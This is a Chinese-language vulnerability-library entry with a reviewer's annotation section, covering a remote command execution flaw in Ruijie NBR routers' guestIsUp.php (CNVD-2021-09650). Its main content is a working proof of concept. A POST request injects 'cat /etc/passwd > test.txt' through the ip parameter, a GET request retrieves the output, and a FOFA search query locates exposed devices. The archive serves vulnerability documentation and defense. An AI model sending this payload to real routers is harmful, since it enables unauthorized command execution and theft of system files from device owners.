---
source: "wy876 漏洞文库"
id: "vw-8c58a3b8031408c333bd5ca1"
entity_id: "ve-8c58a3b8031408c333bd5ca1"
schema_version: "1"
title: "锐捷NBR路由器guestIsUp.php远程命令执行漏洞"
product: "Ruijie NBR EWEB"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "CNVD-2021-09650"
referenced_identifiers: ""
prerequisites: "无Cookie示例，固件未给"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7NBR%E8%B7%AF%E7%94%B1%E5%99%A8guestIsUp.php%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hon6ugvrmt270v4x"
source_status: "recorded"
---

# 锐捷NBR路由器guestIsUp.php远程命令执行漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie NBR EWEB
- 本文讨论：guestIsUp.php ip注入；关联CNVD-2021-09650
- 版本、权限与配置前提：无Cookie示例，固件未给
- 资料类型：重复PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 同738两个步骤，缺结果/源码但入口相同
- 没有CNVD标注；固定test.txt旧内容和残留风险
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 编号对应/版本待原始公告核实
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


**一、漏洞简介**  
<font style="color:rgb(34, 34, 34);">锐捷网络是一家拥有包括交换机、路由器、软件、安全防火墙、无线产品、存储等全系列的网络设备产品线及解决方案的专业化网络厂商。锐捷NBR 路由器系统存在</font><font style="color:rgb(255, 0, 0);">远程命令执行</font><font style="color:rgb(34, 34, 34);">漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。</font>  
**二、影响版本**

Ruijie-NBR路由器

**三、资产测绘**

```plain
app="Ruijie-NBR路由器"
```

●登录页面

  
**四、漏洞复现**

<font style="color:rgb(34, 34, 34);">1.执行查看用户并写入当前目录test.txt的poc</font>

```http
POST /guest_auth/guestIsUp.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Connection: close
Content-Length: 45
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

mac=1&ip=127.0.0.1|cat /etc/passwd > test.txt
```


<font style="color:rgb(34, 34, 34);">2.访问该文件，得到回显</font>

```http
GET /guest_auth/test.txt HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Accept-Encoding: gzip, deflate
```


  


若有收获，就点个赞吧

  
 


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hon6ugvrmt270v4x>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
